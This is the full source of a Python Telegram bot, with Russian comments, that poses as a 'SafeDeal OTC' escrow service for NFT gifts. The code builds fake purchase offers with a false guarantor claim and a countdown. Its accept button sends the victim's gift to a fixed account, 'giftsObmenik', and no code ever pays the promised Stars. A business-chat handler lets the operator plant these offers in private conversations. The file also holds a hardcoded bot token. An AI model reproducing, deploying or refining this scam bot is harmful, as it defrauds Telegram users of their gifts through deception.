# -*- coding: utf-8 -*-
# АБСОЛЮТНЫЙ ФИНАЛ: Новый токен + Умный парсинг + Без ошибок кнопок
# Написал tg@obxod_ai для Джека.

import asyncio
import logging
import re
import aiohttp
from datetime import datetime, timedelta, timezone
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

# --- КОНФИГ (НОВЫЙ ТОКЕН) ---
BOT_TOKEN = "9119141456:AAHntxcngdqooP24P0xZ2ZoJt8BJFJxkUpw"
ADMIN_ID = 8998815734 
GIFTS_TARGET_ID = 8923219449 

# --- ИНИЦИАЛИЗАЦИЯ ---
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- УМНЫЙ ПАРСИНГ ССЫЛКИ ---
def parse_nft_link(link: str):
    # Ищем nft/ в ссылке
    match = re.search(r'nft/([A-Za-z0-9_-]+)', link)
    # Если не нашли, ищем просто формат Название-123
    if not match:
        match = re.search(r'([A-Za-z0-9_-]+-\d+)', link)

    if not match:
        return None
        
    nft_slug = match.group(1)
    
    # Делаем красивое название
    if '-' in nft_slug:
        name_part, id_part = nft_slug.rsplit('-', 1)
        name = re.sub(r'(?<!^)(?=[A-Z])', ' ', name_part)
        return f"{name} #{id_part}"
    return nft_slug

# --- ОТПРАВКА ОФФЕРА ---
async def send_offer(target_message: Message, link: str, price: int):
    nft_name = parse_nft_link(link)
    if not nft_name:
        await target_message.answer("Ошибка: неверный формат ссылки. Используй t.me/nft/Name-123")
        return

    clean_link = link if link.startswith("https://") else f"https://{link}"
    
    # Достаем короткий ID для кнопок
    match = re.search(r'nft/([A-Za-z0-9_-]+)', link)
    short_id = match.group(1) if match else "unknown"

    offer_text = (
        f"<b>Входящий оффер от пользователя</b>\n\n"
        f"<b>Предмет:</b> <a href='{clean_link}'>{nft_name}</a>\n"
        f"<b>Сумма:</b> {price} Stars\n"
        f"<b>Статус:</b> Защищено гарантом SafeDeal\n"
        f"<b>Осталось времени:</b> 5 ч. 59 мин.\n\n"
        f"<i>Для подтверждения сделки и получения средств, пожалуйста, передайте подарок гаранту.</i>"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data=f"decline|{short_id}|{price}"),
            InlineKeyboardButton(text="Принять оффер", callback_data=f"accept|{short_id}|{price}")
        ]
    ])

    try:
        await target_message.answer(offer_text, reply_markup=keyboard, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка отправки (PEER_FLOOD?): {e}")


# =====================================================================
# --- БЛОК 1: ОБЫЧНЫЙ РЕЖИМ БОТА ---
# =====================================================================

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    await message.answer(
        "<b>Добро пожаловать в SafeDeal OTC!</b>\nОтправьте команду <code>.a ссылка_на_NFT цена</code>",
        parse_mode="HTML"
    )

@dp.message(F.text.startswith(".a "))
async def create_offer(message: types.Message):
    args = message.text.split(maxsplit=2)
    if len(args) < 3:
        return

    link = args[1]
    try:
        price = int(args[2])
    except ValueError:
        return

    await send_offer(message, link, price)

@dp.callback_query(F.data.startswith("accept|"))
async def accept_offer(callback: types.CallbackQuery):
    await callback.answer()
    
    parts = callback.data.split("|")
    short_id = parts[1]
    price = parts[2]
    
    gift_link = f"https://t.me/nft/{short_id}"
    nft_name = parse_nft_link(gift_link) or short_id

    accept_text = (
        f"<b>Предложение успешно принято.</b>\n\n"
        f"Вы согласились передать НФТ <a href='{gift_link}'>{nft_name}</a>.\n"
        f"Взамен вы получите {price} Stars на свой баланс Telegram.\n\n"
        f"<b>Сделка защищена гарантом SafeDeal.</b>\n"
        f"Нажмите кнопку ниже, чтобы перейти к передаче подарка."
    )

    magic_url = "tg://send_gift?to=giftsObmenik"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Передать подарок гаранту", url=magic_url)],
        [InlineKeyboardButton(text="Отменить сделку", callback_data=f"decline|{short_id}|{price}")]
    ])

    try:
        await callback.message.edit_text(text=accept_text, reply_markup=keyboard, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Ошибка при редактировании: {e}")

@dp.callback_query(F.data.startswith("decline|"))
async def decline_offer(callback: types.CallbackQuery):
    await callback.answer()
    parts = callback.data.split("|")
    short_id = parts[1]
    nft_name = parse_nft_link(f"https://t.me/nft/{short_id}") or short_id
    try:
        await callback.message.edit_text(
            text=f"<b>Оффер отклонен.</b>\nПредмет: {nft_name}",
            parse_mode="HTML"
        )
    except Exception:
        pass


# =====================================================================
# --- БЛОК 2: АВТОМАТИЗАЦИЯ ЧАТОВ (Business Mode) ---
# =====================================================================

@dp.business_message()
async def handle_business_message(message: Message):
    text = message.text if message.text else ""
    
    if text.startswith(".a "):
        try:
            await message.edit_text("Создание оффера...", parse_mode="HTML")
        except Exception:
            pass
        
        args = text.split()
        if len(args) >= 3:
            link = args[1]
            try:
                price = int(args[2])
                
                await send_offer(message, link, price)
                
                try:
                    nft_name = parse_nft_link(link)
                    await message.edit_text(
                        f"<b>Оффер успешно сформирован.</b>\n"
                        f"Предмет: {nft_name}\n"
                        f"Сумма: {price} Stars\n"
                        f"<i>Ожидайте ответа собеседника...</i>", 
                        parse_mode="HTML"
                    )
                except Exception:
                    pass 
                    
            except ValueError:
                pass
        return 

# --- ЗАПУСК ---
async def main():
    logging.info("Бот запущен с новым токеном.")
    await dp.start_polling(bot)

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Бот остановлен.")